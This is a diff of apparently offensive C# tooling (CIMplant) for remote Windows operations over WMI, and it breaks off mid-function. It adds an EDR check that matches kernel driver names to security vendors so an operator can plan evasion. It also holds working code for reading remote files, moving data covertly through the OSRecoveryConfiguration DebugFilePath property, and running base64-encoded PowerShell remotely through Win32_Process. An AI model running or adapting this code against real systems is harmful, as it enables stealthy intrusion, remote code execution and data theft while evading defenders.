@@ -301,10 +301,296 @@ namespace CIMplant
             return queryCollection;
         }
 
+        // Idea and some code thanks to Harley - https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
+        public object edr_query(Planter planter)
+        {
+            ManagementScope scope = planter.Connector.ConnectedWmiSession;
+            bool activeEdr = false;
+
+            ObjectQuery fileQuery = new ObjectQuery(@"SELECT * FROM CIM_DataFile WHERE Path = '\\windows\\System32\\drivers\\'");
+            ManagementObjectSearcher fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
+            ManagementObjectCollection queryCollection = fileSearcher.Get();
+
+            foreach (var o in queryCollection)
+            {
+                var wmiObject = (ManagementObject)o;
+                string fileName = Path.GetFileName((string)wmiObject["Name"]);
+
+                switch (fileName)
+                {
+                    case "FeKern.sys":
+                    case "WFP_MRT.sys":
+                        Messenger.ErrorMessage("FireEye Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "eaw.sys":
+                        Messenger.ErrorMessage("Raytheon Cyber Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "rvsavd.sys":
+                        Messenger.ErrorMessage("CJSC Returnil Software Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "dgdmk.sys":
+                        Messenger.ErrorMessage("Verdasys Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "atrsdfw.sys":
+                        Messenger.ErrorMessage("Altiris (Symantec) Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "mbamwatchdog.sys":
+                        Messenger.ErrorMessage("Malwarebytes Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "edevmon.sys":
+                    case "ehdrv.sys":
+                        Messenger.ErrorMessage("ESET Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SentinelMonitor.sys":
+                        Messenger.ErrorMessage("SentinelOne Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "edrsensor.sys":
+                    case "hbflt.sys":
+                    case "bdsvm.sys":
+                    case "gzflt.sys":
+                    case "bddevflt.sys":
+                    case "AVCKF.SYS":
+                    case "Atc.sys":
+                    case "AVC3.SYS":
+                    case "TRUFOS.SYS":
+                    case "BDSandBox.sys":
+                        Messenger.ErrorMessage("BitDefender Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "HexisFSMonitor.sys":
+                        Messenger.ErrorMessage("Hexis Cyber Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CyOptics.sys":
+                    case "CyProtectDrv32.sys":
+                    case "CyProtectDrv64.sys":
+                        Messenger.ErrorMessage("Cylance Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "aswSP.sys":
+                        Messenger.ErrorMessage("Avast Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "mfeaskm.sys":
+                    case "mfencfilter.sys":
+                    case "epdrv.sys":
+                    case "mfencoas.sys":
+                    case "mfehidk.sys":
+                    case "swin.sys":
+                    case "hdlpflt.sys":
+                    case "mfprom.sys":
+                    case "MfeEEFF.sys":
+                        Messenger.ErrorMessage("McAfee Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "groundling32.sys":
+                    case "groundling64.sys":
+                        Messenger.ErrorMessage("Dell Secureworks Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "avgtpx86.sys":
+                    case "avgtpx64.sys":
+                        Messenger.ErrorMessage("AVG Technologies Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "pgpwdefs.sys":
+                    case "GEProtection.sys":
+                    case "diflt.sys":
+                    case "sysMon.sys":
+                    case "ssrfsf.sys":
+                    case "emxdrv2.sys":
+                    case "reghook.sys":
+                    case "spbbcdrv.sys":
+                    case "bhdrvx86.sys":
+                    case "bhdrvx64.sys":
+                    case "SISIPSFileFilter.sys":
+                    case "symevent.sys":
+                    case "vxfsrep.sys":
+                    case "VirtFile.sys":
+                    case "SymAFR.sys":
+                    case "symefasi.sys":
+                    case "symefa.sys":
+                    case "symefa64.sys":
+                    case "SymHsm.sys":
+                    case "evmf.sys":
+                    case "GEFCMP.sys":
+                    case "VFSEnc.sys":
+                    case "pgpfs.sys":
+                    case "fencry.sys":
+                    case "symrg.sys":
+                        Messenger.ErrorMessage("Symantec Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SAFE-Agent.sys":
+                        Messenger.ErrorMessage("SAFE-Cyberdefense Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CybKernelTracker.sys":
+                        Messenger.ErrorMessage("CyberArk Software Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "klifks.sys":
+                    case "klifaa.sys":
+                    case "Klifsm.sys":
+                        Messenger.ErrorMessage("Kaspersky Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SAVOnAccess.sys":
+                    case "savonaccess.sys":
+                    case "sld.sys":
+                        Messenger.ErrorMessage("Sophos Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "ssfmonm.sys":
+                        Messenger.ErrorMessage("Webroot Software, Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CarbonBlackK.sys":
+                    case "carbonblackk.sys":
+                    case "Parity.sys":
+                    case "cbk7.sys":
+                    case "cbstream.sys":
+                        Messenger.ErrorMessage("Carbon Black Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CRExecPrev.sys":
+                        Messenger.ErrorMessage("Cybereason Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "im.sys":
+                    case "CSAgent.sys":
+                    case "CSBoot.sys":
+                    case "CSDeviceControl.sys":
+                    case "cspcm2.sys":
+                        Messenger.ErrorMessage("CrowdStrike Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "cfrmd.sys":
+                    case "cmdccav.sys":
+                    case "cmdguard.sys":
+                    case "CmdMnEfs.sys":
+                    case "MyDLPMF.sys":
+                        Messenger.ErrorMessage("Comodo Security Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "PSINPROC.SYS":
+                    case "PSINFILE.SYS":
+                    case "amfsm.sys":
+                    case "amm8660.sys":
+                    case "amm6460.sys":
+                        Messenger.ErrorMessage("Panda Security Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "fsgk.sys":
+                    case "fsatp.sys":
+                    case "fshs.sys":
+                        Messenger.ErrorMessage("F-Secure Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "esensor.sys":
+                        Messenger.ErrorMessage("Endgame Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "csacentr.sys":
+                    case "csaenh.sys":
+                    case "csareg.sys":
+                    case "csascr.sys":
+                    case "csaav.sys":
+                    case "csaam.sys":
+                        Messenger.ErrorMessage("Cisco Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "TMUMS.sys":
+                    case "hfileflt.sys":
+                    case "TMUMH.sys":
+                    case "AcDriver.sys":
+                    case "SakFile.sys":
+                    case "SakMFile.sys":
+                    case "fileflt.sys":
+                    case "TmEsFlt.sys":
+                    case "tmevtmgr.sys":
+                    case "TmFileEncDmk.sys":
+                        Messenger.ErrorMessage("Trend Micro Inc Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "epregflt.sys":
+                    case "medlpflt.sys":
+                    case "dsfa.sys":
+                    case "cposfw.sys":
+                        Messenger.ErrorMessage("Check Point Software Technologies Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "psepfilter.sys":
+                    case "cve.sys":
+                        Messenger.ErrorMessage("Absolute Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "brfilter.sys":
+                        Messenger.ErrorMessage("Bromium Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "LRAgentMF.sys":
+                        Messenger.ErrorMessage("LogRhythm Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "libwamf.sys":
+                        Messenger.ErrorMessage("OPSWAT Inc Found!");
+                        activeEdr = true;
+                        break;
+                }
+            }
+
+            if (!activeEdr)
+                Console.WriteLine("No EDR vendors found, tread carefully");
+
+            return true;
+        }
+
 
         ///////////////////////////////////////           FILE OPERATIONS            /////////////////////////////////////////////////////////////////////
 
-        // WORKING CURRENTLY BUT WITH POWERSHELL :(//
         public object cat(Planter planter)
         {
             ManagementScope scope = planter.Connector.ConnectedWmiSession;
@@ -316,92 +602,31 @@ namespace CIMplant
                 return null;
             }
 
-            string originalWmiProperty = GetOsRecovery(scope);
-            bool wsman = true;
-
             Messenger.GoodMessage("[+] Printing file: " + path);
             Messenger.GoodMessage("--------------------------------------------------------\n");
 
-            if (wsman == true)
+            // https://twitter.com/mattifestation/status/1220713684756049921 but modified :)
+            ObjectGetOptions options = new ObjectGetOptions();
+            ManagementPath pather = new ManagementPath($"\\\\{planter.Connector.SystemToConn}\\root\\Microsoft\\Windows\\Powershellv3");
+            ManagementClass classInstance = new ManagementClass(scope, pather, options);
+            ManagementObject newInstance = classInstance.CreateInstance();
+            newInstance["InstanceID"] = path;
+            newInstance.Put();
+
+            ManagementObjectSearcher searcher =
+                new ManagementObjectSearcher("root\\Microsoft\\Windows\\Powershellv3",
+                $"SELECT * FROM PS_ModuleFile WHERE InstanceID = {path}");
+
+            foreach (ManagementObject queryObj in searcher.Get())
             {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                if (queryObj["FileData"] == null)
+                    return true;
+                else
                 {
-                    try
-                    {
-                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
-                        {
-                            // Since we can't run a local runspace as admin let's just grab the file using normal c# code (pro: avoids PS)
-                            //powershell.Runspace = RunspaceCreateLocal();
-                            // We might need to catch if people try to cat binary files in the future
-                            Console.WriteLine(System.IO.File.ReadAllText(path));
-                            return true;
-                        }
-                    }
-                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
-                    {
-                        wsman = false;
-                    }
-                    catch (UnauthorizedAccessException)
-                    {
-                        Messenger.ErrorMessage("[-] Error: Access to the file is denied. If running against the local system use Admin prompt.");
-                        return null;
-                    }
-
-                    if (powershell.Runspace.ConnectionInfo != null)
-                    {
-                        string command1 = "$data = (Get-Content " + path + " | Out-String).Trim()";
-                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
-                        const string command3 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-                        powershell.Invoke();
-                    }
-                    else
-                        wsman = false;
+                    Byte[] arrFileData = (Byte[])(queryObj["FileData"]);
+                    Console.WriteLine(Encoding.UTF8.GetString(arrFileData, 0, arrFileData.Length));
                 }
             }
-
-            if (wsman == false)
-            {
-                // WSMAN not enabled on the remote system, use another method
-                ObjectGetOptions options = new ObjectGetOptions();
-                ManagementPath pather = new ManagementPath("Win32_Process");
-                ManagementClass classInstance = new ManagementClass(scope, pather, options);
-                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
-
-                string encodedCommand = "$data = (Get-Content " + path +
-                                        " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-                var encodedCommandB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-
-                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
-                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-            }
-
-            // Give it a second to write and check for changes to DebugFilePath
-            Thread.Sleep(1000);
-            CheckForFinishedDebugFilePath(originalWmiProperty, scope);
-
-            //Get the contents of the file in the DebugFilePath prop
-            string[] fileOutput = GetOsRecovery(scope).Split(',');
-
-            StringBuilder output = new StringBuilder();
-
-            //Print file output.
-            foreach (string integer in fileOutput)
-            {
-                char a = (char) Convert.ToInt32(integer);
-                output.Append(a);
-            }
-
-            Console.WriteLine(output);
-            SetOsRecovery(scope, originalWmiProperty);
-
             return true;
         }
 
@@ -469,93 +694,101 @@ namespace CIMplant
 
             Messenger.GoodMessage("[+] Downloading file: " + downloadPath);
             Messenger.GoodMessage("--------------------------------------------------------\n");
-
-            if (wsman == true)
+            
+            if (!planter.Commander.NoPS)
             {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                if (wsman == true)
+                {
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
+                    {
+                        try
+                        {
+                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
+                                powershell.Runspace = RunspaceCreate(planter);
+                            else
+                                powershell.Runspace = RunspaceCreateLocal();
+                        }
+                        catch (System.Management.Automation.Remoting.PSRemotingTransportException)
+                        {
+                            wsman = false;
+                        }
+
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath + "'";
+                            const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
+                            const string command3 =
+                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+                            powershell.Invoke();
+                        }
+                        else
+                            wsman = false;
+                    }
+                }
+
+                if (wsman == false)
+                {
+                    // WSMAN not enabled on the remote system, use another method
+                    ObjectGetOptions options = new ObjectGetOptions();
+                    ManagementPath pather = new ManagementPath("Win32_Process");
+                    ManagementClass classInstance = new ManagementClass(scope, pather, options);
+                    ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+
+                    string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
+                             "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+
+                    string fullCommand = "powershell -enc " + encodedCommandB64;
+
+                    inParams["CommandLine"] = fullCommand;
+
+                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
+
+                }
+
+                // Give it a second to write and check for changes to DebugFilePath
+                Thread.Sleep(1000);
+                CheckForFinishedDebugFilePath(originalWmiProperty, scope);
+
+                //Get the contents of the file in the DebugFilePath prop
+                string[] fileOutput = GetOsRecovery(scope).Split(',');
+
+                //Create list for bytes
+                List<byte> outputList = new List<byte>();
+
+                //Convert from int (bytes) to byte
+                foreach (string integer in fileOutput)
                 {
                     try
                     {
-                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
-                            powershell.Runspace = RunspaceCreateLocal();
+                        byte a = (byte)Convert.ToInt32(integer);
+                        outputList.Add(a);
                     }
-                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
+                    catch
                     {
-                        wsman = false;
+                        //pass
                     }
-
-                    if (powershell.Runspace.ConnectionInfo != null)
-                    {
-                        string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath + "'";
-                        const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
-                        const string command3 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-                        powershell.Invoke();
-                    }
-                    else
-                        wsman = false;
                 }
-            }
 
-            if (wsman == false)
+                //Save to local dir if no directory specified
+                if (string.IsNullOrEmpty(writePath))
+                    writePath = Path.GetFileName(downloadPath);
+
+                File.WriteAllBytes(writePath, outputList.ToArray());
+
+                SetOsRecovery(scope, originalWmiProperty);
+            }
+            else
             {
-                // WSMAN not enabled on the remote system, use another method
-                ObjectGetOptions options = new ObjectGetOptions();
-                ManagementPath pather = new ManagementPath("Win32_Process");
-                ManagementClass classInstance = new ManagementClass(scope, pather, options);
-                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
-
-                string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
-                         "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-                
-                string fullCommand = "powershell -enc " + encodedCommandB64;
-
-                inParams["CommandLine"] =  fullCommand;
-
-                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
             }
 
-            // Give it a second to write and check for changes to DebugFilePath
-            Thread.Sleep(1000);
-            CheckForFinishedDebugFilePath(originalWmiProperty, scope);
-
-            //Get the contents of the file in the DebugFilePath prop
-            string[] fileOutput = GetOsRecovery(scope).Split(',');
-
-            //Create list for bytes
-            List<byte> outputList = new List<byte>();
-
-            //Convert from int (bytes) to byte
-            foreach (string integer in fileOutput)
-            {
-                try
-                {
-                    byte a = (byte) Convert.ToInt32(integer);
-                    outputList.Add(a);
-                }
-                catch
-                {
-                    //pass
-                }
-            }
-
-            //Save to local dir if no directory specified
-            if (string.IsNullOrEmpty(writePath))
-                writePath = Path.GetFileName(downloadPath);
-
-            File.WriteAllBytes(writePath, outputList.ToArray());
-
-            SetOsRecovery(scope, originalWmiProperty);
             return true;
         }
 
@@ -679,82 +912,90 @@ namespace CIMplant
             Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
             Messenger.GoodMessage("--------------------------------------------------------------------\n");
 
-            List<int> intList = new List<int>();
-            byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);
-
-            //Convert from byte to int (bytes)
-            foreach (byte uploadByte in uploadFileBytes)
+            if (!planter.Commander.NoPS)
             {
-                int a = uploadByte;
-                intList.Add(a);
-            }
+                List<int> intList = new List<int>();
+                byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);
 
-            SetOsRecovery(scope, string.Join(",", intList));
-
-            // Give it a second to write and check for changes to DebugFilePath
-            Thread.Sleep(1000);
-            CheckForFinishedDebugFilePath(originalWmiProperty, scope);
-
-            if (wsman == true)
-            {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                //Convert from byte to int (bytes)
+                foreach (byte uploadByte in uploadFileBytes)
                 {
-                    try
-                    {
-                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
-                            powershell.Runspace = RunspaceCreateLocal();
-                    }
-                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
-                    {
-                        wsman = false;
-                    }
-
-                    if (powershell.Runspace.ConnectionInfo != null)
-                    {
-                        const string command1 =
-                        @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
-                        const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
-                        string command3 =
-                            @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
-                            writePath + "' -Value $decoded";
-
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-                        powershell.Invoke();
-                    }
-                    else
-                        wsman = false;
+                    int a = uploadByte;
+                    intList.Add(a);
                 }
-            }
 
-            if (wsman == false)
-            {
-                // WSMAN not enabled on the remote system, use another method
-                ObjectGetOptions options = new ObjectGetOptions();
-                ManagementPath pather = new ManagementPath("Win32_Process");
-                ManagementClass classInstance = new ManagementClass(scope, pather, options);
-                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+                SetOsRecovery(scope, string.Join(",", intList));
 
-                string encodedCommand =
-                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
-                    writePath + "' -Value $decoded";
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-
-                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
-
-                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-
-                // Give it a second to write
+                // Give it a second to write and check for changes to DebugFilePath
                 Thread.Sleep(1000);
+                CheckForFinishedDebugFilePath(originalWmiProperty, scope);
+
+                if (wsman == true)
+                {
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
+                    {
+                        try
+                        {
+                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
+                                powershell.Runspace = RunspaceCreate(planter);
+                            else
+                                powershell.Runspace = RunspaceCreateLocal();
+                        }
+                        catch (System.Management.Automation.Remoting.PSRemotingTransportException)
+                        {
+                            wsman = false;
+                        }
+
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            const string command1 =
+                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
+                            const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
+                            string command3 =
+                                @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
+                                writePath + "' -Value $decoded";
+
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+                            powershell.Invoke();
+                        }
+                        else
+                            wsman = false;
+                    }
+                }
+
+                if (wsman == false)
+                {
+                    // WSMAN not enabled on the remote system, use another method
+                    ObjectGetOptions options = new ObjectGetOptions();
+                    ManagementPath pather = new ManagementPath("Win32_Process");
+                    ManagementClass classInstance = new ManagementClass(scope, pather, options);
+                    ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+
+                    string encodedCommand =
+                        "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
+                        writePath + "' -Value $decoded";
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+
+                    inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
+
+                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
+
+                    // Give it a second to write
+                    Thread.Sleep(1000);
+                }
+
+                // Set OSRecovery back to normal pls
+                SetOsRecovery(scope, originalWmiProperty);
+            }
+            else
+            {
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
             }
 
-            // Set OSRecovery back to normal pls
-            SetOsRecovery(scope, originalWmiProperty);
             return true;
         }
 
@@ -780,160 +1021,180 @@ namespace CIMplant
             Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
             Messenger.GoodMessage("--------------------------------------------------------\n");
 
-            if (wsman == true)
+            if (!planter.Commander.NoPS)
             {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                if (wsman == true)
                 {
-                    try
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
                     {
-                        if (!string.IsNullOrEmpty(planter.System?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
+                        try
                         {
-                            powershell.Runspace = RunspaceCreateLocal();
-                            powershell.AddCommand(command);
-                            Collection<PSObject> result = powershell.Invoke();
-                            foreach (PSObject a in result)
+                            if (!string.IsNullOrEmpty(planter.System?.ToString()))
+                                powershell.Runspace = RunspaceCreate(planter);
+                            else
                             {
-                                Console.WriteLine(a);
-                            }
+                                powershell.Runspace = RunspaceCreateLocal();
+                                powershell.AddCommand(command);
+                                Collection<PSObject> result = powershell.Invoke();
+                                foreach (PSObject a in result)
+                                {
+                                    Console.WriteLine(a);
+                                }
 
-                            return true;
+                                return true;
+                            }
                         }
-                    }
-                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
-                    {
-                        wsman = false;
-                        goto GetOut; // Do this so we're not doing below work when we don't need to
-                    }
-
-                    if (powershell.Runspace.ConnectionInfo != null)
-                    {
-                        string command1 = "$data = (" + command + " | Out-String).Trim()";
-                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
-                        const string command3 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-
-                        // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
-                        if (noDebugCheck)
+                        catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                         {
-                            // start the timer and get a timeout
-                            DateTime startTime = DateTime.Now;
-                            IAsyncResult asyncPs = powershell.BeginInvoke();
+                            wsman = false;
+                            goto GetOut; // Do this so we're not doing below work when we don't need to
+                        }
 
-                            while (asyncPs.IsCompleted == false)
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            string command1 = "$data = (" + command + " | Out-String).Trim()";
+                            const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
+                            const string command3 =
+                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+
+                            // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
+                            if (noDebugCheck)
                             {
-                                //Console.WriteLine("Waiting for pipeline to finish...");
-                                Thread.Sleep(10000);
+                                // start the timer and get a timeout
+                                DateTime startTime = DateTime.Now;
+                                IAsyncResult asyncPs = powershell.BeginInvoke();
 
-                                // Check on our timeout here
-                                TimeSpan elasped = DateTime.Now.Subtract(startTime);
-                                if (elasped > timeout)
-                                    break;
+                                while (asyncPs.IsCompleted == false)
+                                {
+                                    //Console.WriteLine("Waiting for pipeline to finish...");
+                                    Thread.Sleep(10000);
+
+                                    // Check on our timeout here
+                                    TimeSpan elasped = DateTime.Now.Subtract(startTime);
+                                    if (elasped > timeout)
+                                        break;
+                                }
+                                //powershell.EndInvoke(asyncPs);
                             }
-                            //powershell.EndInvoke(asyncPs);
+                            else
+                                powershell.Invoke();
                         }
                         else
-                            powershell.Invoke();
+                            wsman = false;
+                    }
+                }
+
+                GetOut:
+                if (wsman == false)
+                {
+                    if (string.IsNullOrEmpty(planter.System?.ToString()))
+                    {
+                        try
+                        {
+                            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
+                            {
+                                RedirectStandardOutput = true,
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            };
+
+                            Process proc = new Process { StartInfo = procStartInfo };
+                            proc.Start();
+
+                            // Get the output into a string
+                            string result = proc.StandardOutput.ReadToEnd();
+                            // Display the command output.
+                            Console.WriteLine(result);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
+
+                        return true;
+                    }
+
+                    // WSMAN not enabled on the remote system, use another method
+                    ObjectGetOptions options = new ObjectGetOptions();
+                    ManagementPath pather = new ManagementPath("Win32_Process");
+                    ManagementClass classInstance = new ManagementClass(scope, pather, options);
+                    ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
+
+                    string encodedCommand = "$data = (" + command +
+                                            " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+
+                    inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
+
+                    if (noDebugCheck)
+                    {
+                        // Method Options to set a timeout
+                        InvokeMethodOptions methodOptions = new InvokeMethodOptions(null, timeout);
+
+                        ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, methodOptions);
                     }
                     else
-                        wsman = false;
+                    {
+                        ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
+                    }
                 }
-            }
 
-            GetOut:
-            if (wsman == false)
-            {
-                if (string.IsNullOrEmpty(planter.System?.ToString()))
+                if (!noDebugCheck)
                 {
-                    try
+                    // Give it a second to write and check for changes to DebugFilePath
+                    Thread.Sleep(5000);
+                    CheckForFinishedDebugFilePath(originalWmiProperty, scope);
+
+
+                    //Get the contents of the file in the DebugFilePath prop
+                    string[] commandOutput = GetOsRecovery(scope).Split(',');
+                    StringBuilder output = new StringBuilder();
+
+                    //Print output.
+                    foreach (string integer in commandOutput)
                     {
-                        ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
+                        try
                         {
-                            RedirectStandardOutput = true,
-                            UseShellExecute = false,
-                            CreateNoWindow = true
-                        };
-
-                        Process proc = new Process { StartInfo = procStartInfo };
-                        proc.Start();
-
-                        // Get the output into a string
-                        string result = proc.StandardOutput.ReadToEnd();
-                        // Display the command output.
-                        Console.WriteLine(result);
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
+                            char a = (char)Convert.ToInt32(integer);
+                            output.Append(a);
+                        }
+                        catch
+                        {
+                            //pass
+                        }
                     }
 
-                    return true;
+                    Console.WriteLine(output);
                 }
+                else
+                    Console.WriteLine("New process spawned, not checking for output");
 
-                // WSMAN not enabled on the remote system, use another method
+                SetOsRecovery(scope, originalWmiProperty);
+            }
+            else
+            {
